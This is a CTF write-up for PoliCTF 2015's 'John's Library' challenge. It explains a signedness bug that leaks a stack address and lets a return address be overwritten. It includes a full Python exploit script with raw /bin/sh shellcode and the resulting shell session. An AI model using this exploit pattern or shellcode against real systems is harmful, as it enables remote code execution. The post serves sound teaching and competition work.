---
layout: post
title: "PoliCTF 2015 John's Library"
date: 2015-07-12 17:20:52 -0400
author: [barrebas, swappage]
comments: true
categories: [polictf]
---

### Solved by barrebas and Swappage

Finally, pwnables! John's Library was worth 150 points. I was a bit rusty but I managed to grab this flag. 

<!--more-->

We're given a 32 bit Linux ELF. Upon running it, we're presented with a library menu, where we can view titles, add them and exit the program:

```bash
Welcome to the jungle library mate! Try to escape!!
 
 r - read from library
 a - add element
 u - exit
a
Hey mate! Insert how long is the book title: 
10000
Hey you! what are you trying to do??
```

So we can't really add long titles. Upon inspection, Swappage and I noticed that the titles are stored on the stack, with the lengths in a special data structure in the `.data` of the binary:

```
 8048731: mov    eax,DWORD PTR [eax*4+0x804a060] ; 0x804a060 contains lengths
 8048738: mov    edx,eax
 804873a: mov    eax,DWORD PTR [ebp+0x8]         ; ptr to first book
 804873d: add    eax,edx                         ; add length of last string to it
 804873f: mov    DWORD PTR [esp],eax
 8048742: call   8048410 <gets@plt>              ; grab book title
```

I noticed I could bypass the length check with a large number, effectively utilizing a signedness bug. This allowed us to overwrite the return address of `main()` on the stack. Although NX wasn't enabled, ASLR was enabled so we couldn't just jump to the shellcode on the stack. There weren't enough gadgets for a ROP chain. Instead, we needed to leak a stack address so we could return to the shellcode on the stack (bruteforcing it didn't work). That's where the read function came into play.

Looking up a book title via the read function was done like this:

```
 8048678: mov    eax,DWORD PTR [ebp-0xc]         ; number we just submitted
 804867b: mov    eax,DWORD PTR [eax*4+0x804a060] ; grab length of that book title
 8048682: mov    edx,eax
 8048684: mov    eax,DWORD PTR [ebp+0x8]         ; pointer to book titles on stack
 8048687: add    eax,edx                         ; add length of string so eax points to book title 
 8048689: mov    DWORD PTR [esp+0x4],eax
 804868d: mov    DWORD PTR [esp],0x8048893
 8048694: call   80483f0 <printf@plt>            ; dump title to user
```

By passing in a negative number, I was able to make `804867b: mov eax,DWORD PTR [eax*4+0x804a060]` point to `0x80493fc`, which contained `0xffffffe0`. Therefore, when this value is added to the pointer to the book titles, it actually is moved backwards and starts leaking stack addresses:

```
0xffffd1ab (address of book titles on stack) + 0xffffffe0 => 
gdb-peda$ x/10x $eax
0xffffd18b: 0x048614->ff    0xffd1ab<-08    0x000002ff  0x15fd7c00
0xffffd19b: 0x15fd7c00  0x15fd7c00  0x0000f000  0x0000f000
```

I now had a way to leak the book title buffer on the stack, where we could store shellcode in a book title. By exploiting the signedness bug, we could overwrite the return address of `main()`. After setting all of this up, we'd ask the binary to exit and make it return to our shellcode. Putting it all together:

```python
from socket import *
import struct, telnetlib, re, sys, time

def readtil(delim):
    buf = b''
    while not delim in buf:
        buf += s.recv(1)
    return buf

def sendln(b):
    s.send(b + b'\n')

def sendbin(b):
    s.sendall(b)

def p(x):
    return struct.pack('<L', x & 0xffffffff)
    
def pwn():
    global s
    s=socket(AF_INET, SOCK_STREAM)
    s.connect(('library.polictf.it', 80))

    readtil('exit')
    
    # mem leak
    sendln('r')
    readtil('read:')
    sendln('-793')  
    # -793*4 = 0xfffff39c; 
    # 0x804867b <read_from_library+58>: mov eax,DWORD PTR [eax*4+0x804a060] 
    # -> 0x80493fc == 0xffffffe0
    
    # leak stack addr
    time.sleep(0.1)
    buf = s.recv(20)
    stackaddr = struct.unpack('<L', buf[6:10])[0]
    print hex(stackaddr+100)
    readtil('exit')
        
    sendln('a')
    readtil('title:')
    sendln('1')
    sendln('b')
    
    readtil('exit')
    
    sendln('a')
    readtil('title:')
    # 2**32 -> integer overflow, 
    # we now have plenty of space to overwrite the saved return address
    sendln('4294967296') 
    
    # the reason i divided the nop sled is simple; for some reason, when the shellcode executes, 
    # it overwrites itself if it's at the end. this solves it; didn't debug it 
    sendln("\x90"*(0x30f-37)+"\x83\xec\x7f\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x8d\x54\x24\x08\x50\x53\x8d\x0c\x24\xb0\x0b\xcd\x80\x31\xc0\xb0\x01\xcc\x80"+"A"*0x100+p(stackaddr+200)) # 0xffffd1ad -> start of our buffer
        
    readtil('exit')
    sendln('u')
    
    t = telnetlib.Telnet()
    t.sock = s

    t.interact()

    s.close()

pwn()
```

And running it:

```bash
bas@tritonal:~/tmp/polictf/johns-library$ python sn0w.py 

id
uid=1001(ctf) gid=1001(ctf) groups=1001(ctf)
cd /home/ctf
ls
challenge
flag
cat flag
flag{John_should_read_a_real_book_on_s3cur3_pr0gr4mm1ng}
```

The flag was `flag{John_should_read_a_real_book_on_s3cur3_pr0gr4mm1ng}`.

